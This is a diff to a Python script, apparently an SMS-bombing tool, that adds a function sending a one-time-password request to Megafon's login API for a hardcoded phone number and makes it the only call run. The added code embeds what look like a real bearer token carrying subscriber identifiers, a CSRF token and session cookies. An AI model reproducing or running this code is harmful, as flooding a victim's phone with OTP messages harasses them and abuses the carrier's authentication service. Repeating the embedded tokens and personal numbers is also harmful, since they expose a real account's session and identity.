@@ -533,15 +533,49 @@ def serv12():
         print(f"serv12 - {response.status_code}")
     except:
         print("serv12 - error")
-serv1()
-serv2()
-serv3()
-serv4()
-serv5()
-serv6()
-serv7()
-serv8()
-serv9()
-serv10()
-serv11()
-serv12()
+def serv13():
+    try:
+        headers = {
+            'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0',
+            'Accept': 'application/json, text/plain, */*',
+            'Accept-Language': 'en-US,en;q=0.5',
+            # 'Accept-Encoding': 'gzip, deflate, br, zstd',
+            'Referer': 'https://lk.megafon.ru/login',
+            'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
+            'X-App-Type': 'react_lk',
+            'X-Cabinet-Id-Param': '2b9fb9a1-8681-4efa-ba2c-90de3580d2f5',
+            'X-Cabinet-Check-Info': 'c2491241-ab6e-46df-a9f0-346ef5078f7a',
+            'X-Cabinet-Validation-Param': '6007dce3-ac40-42cd-95ad-67bd0f4be90d',
+            'X-Cabinet-Authorization': 'Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJFUzI1NiJ9.eyJzdWJzY3JpYmVyWm9uZUlkIjo0NywiYXV0aENoYW5uZWwiOiJPVFAiLCJtYWNyb1JlZ2lvbklkIjo1MDAsIm11bHRpYWNjb3VudFNlc3Npb25UeXBlIjoiTUFTVEVSIiwib3BlckNvZGUiOjUwMCwib3BlcktleSI6IlZPTEdBIiwiaXNzIjoiYXV0aC1zZXJ2ZXIiLCJiaWxsaW5nU2VjdXJpdHlSb2xlIjoiQklMTElOR19BQ0NPVU5UX09XTkVSIiwibWFzdGVyTXNpc2RuIjoiOTM3NDkwMzUzOSIsImN1c3RvbWVySWQiOiIxMzEwMzU1ODIiLCJwc3NvVG9rZW4iOiJleUpyYVdRaU9pSnFkM05mYVdSZmRHOXJaVzRpTENKaGJHY2lPaUpTVXpJMU5pSjkuZXlKemRXSWlPaUl4T1RrNU1UQXdPVFl3T0RRM01qWWlMQ0poY0hCc1gyTnZaR1VpT2lKTlJpMU1TeTFFU1ZJaUxDSmhkWFJvWDNSNWNHVWlPaUpzYjJkcGJpSXNJbUYxZEdoZmJHVjJaV3dpT2pFd01Dd2laR1Z3WVhKMGJXVnVkRjlwWkNJNk9UazVMQ0poY0hCc1gzUjVjR1VpT2lKVFF5SXNJbWx6Y3lJNkltaDBkSEJ6T2k4dmJtVjRhV2R1TG1OdmJTSXNJbk5sYzNOcGIyNWZhV1FpT2lKdllYTXRNREUyWkRSbE5HWXRPVFEyWWkwME9EUXpMVGczTWpBdE5HUTROekZpWVRoaU1qQmhJaXdpY0hKbFptVnljbVZrWDNWelpYSnVZVzFsSWpvaU9UTTNORGt3TXpVek9TSXNJbXh2WTJGc1pTSTZJbkoxSWl3aVlXTnNYMmhoYzJnaU9pSTNaVFkwTWpObU1XTm1aRGczWkdWbFlqTmpNV0ZoTURFNFl6aG1Oemt4TjJabU0ySmpZVEprTnpkbVltSmxNak13TVdGbU1qUXhPR1JrTm1NeFpHRmtJaXdpWVhCd2JGOXBaQ0k2SWsxR0xVeExMVVJKVWlJc0luVnpaWEpmZEhsd1pWOXBaQ0k2TWpVd016QXdNREF5TENKbGVIQWlPakUzTnpJM09EWXdORFlzSW1saGRDSTZNVGMzTWpjNE1qUTBOaXdpYW5ScElqb2lZUzAxWlRZMU5qVmlNQzFqT0RZNExUUXlObVV0T0RnNE5pMWtOek0yT0Rrd05qSmhNREFpZlEuV1JaUHNMMVlHcFFYejQ4dVhYbTdFNG5raFZVdEROc19FQTlfSjVicTRadHRuY3FUbk11c1RtX29mbWsyd0FVeTlZZnlLU3FhMXNZTVlwdFhXUTlZRzRHelF6TDMxMHRMaHdMUVVfbHVLb01QR09CV2hQN1Vfb3hsazRZMUp2ai04NjBPY3BGS2lHc2FQaFFKTmJjRzRnSnVrNWhZVkowNEM5VFVsY2pTbXBtNXhIc3Qzal9XR2ZFZDFTb01KZERNeUNfMXlUdkxidGtuVk9YYWZLaXotMzktNkNvd3B3ekpnNUcyNTh5aW5oYWlEckJaWHNqeW1Hc0FVb1J2RFNJRlBjNnM1eEtGRTdwVHlfVlFTOEZVRDhfZjVXZzYzdUMyaVYyNi1XUGZxdHBKdGY3OWNJYUV5WERDUWViRjJ4QnVNVm9ZRFdaRVpYXzhmLXkzTkxSNU93IiwiY2xpZW50IjoiTUYtTEstRElSIiwiZXhwIjoxNzcyNzgzNjQ3LCJtc2lzZG4iOiI5Mzc0OTAzNTM5IiwiaWF0IjoxNzcyNzgyNDQ3LCJqdGkiOiI4OWMxMmVlZi0xYjk3LTRjZmItODIyOS1hMGQ0Njg1M2MxYjkiLCJicmFuY2hJZCI6MzIsInN1YnNjcmliZXJJZCI6IjEyMTc3MjUyMiIsInRpbWVab25lIjoiQXNpYS9ZZWthdGVyaW5idXJnIiwiY3VzdG9tZXJEYXRhYmFzZUlkIjo5OTksInBzU3NvQWNjb3VudFR5cGUiOiJHRU5FUkFMX0RJUkVDVCIsInN1YnNlZ21lbnQiOiJCMkMiLCJjdXN0b21lck51bWJlclR5cGUiOiJSRUFMX05VTUJFUiIsImNhbGxDZW50ZXJJbXBlcnNvbmF0b3IiOm51bGwsImxrU2VjdXJpdHlSb2xlIjoiQVVUSE9SSVNFRF9aT05FX1VTRVIifQ.0SuW2fLcJ4-jtFgnxFRcFYuQq95tmqDhIl6Y0nId17cNN_vutKpQFso7OoREF93M0tNrQqgWywmlVdsNkaoxzA',
+            'X-CSRF-TOKEN': '20db51b8-26c1-4635-863f-7521ec522cbb',
+            'Origin': 'https://lk.megafon.ru',
+            'Connection': 'keep-alive',
+            # 'Cookie': 'DEVICE-ID=9b2494b6-9bcb-4e54-92e4-aa8794f77495; _ym_uid=1772782435291601158; _ym_d=1772782435; X-Cabinet-Refresh-Token=d5725991-1381-4792-8f0e-065a109ae073; NEW-CSRF-TOKEN=20db51b8-26c1-4635-863f-7521ec522cbb; csrf-token=20db51b8-26c1-4635-863f-7521ec522cbb; JSESSIONID=0a0cb8b2-53f1-49e5-9614-b56922cebf90; _ym_isad=2',
+            'Sec-Fetch-Dest': 'empty',
+            'Sec-Fetch-Mode': 'cors',
+            'Sec-Fetch-Site': 'same-site',
+            'Priority': 'u=0',
+            # Requests doesn't support trailers
+            # 'TE': 'trailers',
+        }
+        data = {
+            'login': '79374903532',
+            'captchaReady': 'true',
+        }
+        response = requests.post('https://api.megafon.ru/mlk/api/auth/otp/request', headers=headers, data=data)
+        print(f"serv13 - {response.status_code}")
+    except:
+        print("serv13 - error")
+# serv1()
+# serv2()
+# serv3()
+# serv4()
+# serv5()
+# serv6()
+# serv7()
+# serv8()
+# serv9()
+# serv10()
+# serv11()
+# serv12()
+serv13()
